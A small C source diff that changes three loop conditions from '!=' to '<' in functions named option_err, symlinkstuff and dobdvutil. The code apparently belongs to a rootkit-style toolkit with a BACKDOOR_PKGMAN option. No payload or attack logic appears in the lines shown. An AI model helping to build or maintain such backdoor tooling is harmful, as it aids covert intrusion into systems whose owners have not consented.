@@ -11,7 +11,7 @@ void option_err(char *a0){
     size_t tmpsize, buflen;
     char validmans[16*VALIDPKGMANS_SIZE];
     memset(validmans, 0, sizeof(validmans));
-    for(int i = 0; i != VALIDPKGMANS_SIZE; i++){
+    for(int i = 0; i < VALIDPKGMANS_SIZE; i++){
         tmpsize = strlen(validpkgmans[i])+2;
         buflen = strlen(validmans);
 
@@ -57,7 +57,7 @@ void symlinkstuff(void){
 
     char *src, *dest, *linkname;
     int ok=0, fail=0, exist=0, acc, syml;
-    for(int i = 0; i != LINKSRCS_SIZE; i++){
+    for(int i = 0; i < LINKSRCS_SIZE; i++){
         src = linksrcs[i];
         dest = linkdests[i];
         linkname = basename(dest);
@@ -95,7 +95,7 @@ void dobdvutil(char *const argv[]){
 
 #ifdef BACKDOOR_PKGMAN
     char *pkgman;
-    for(int pkgmani = 0; pkgmani != VALIDPKGMANS_SIZE; pkgmani++){
+    for(int pkgmani = 0; pkgmani < VALIDPKGMANS_SIZE; pkgmani++){
         pkgman = validpkgmans[pkgmani];
 
         if(!strcmp(pkgman, option)){
